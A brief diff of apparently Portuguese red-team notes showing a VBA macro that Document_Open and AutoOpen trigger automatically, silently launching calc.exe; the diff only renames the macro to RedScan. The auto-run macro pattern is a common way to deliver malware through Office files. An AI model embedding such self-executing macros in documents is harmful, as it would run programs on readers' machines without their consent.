@@ -16,12 +16,12 @@ End Sub
 ## Abrir arquivo
 ```
 Sub Document_Open()
-    MyMacro
+    RedScan
 End Sub
 Sub AutoOpen()
-    MyMacro
+    RedScan
 End Sub
-Sub MyMacro()
+Sub RedScan()
     Dim str As String
     str = "calc.exe"
     Shell str, vbHide
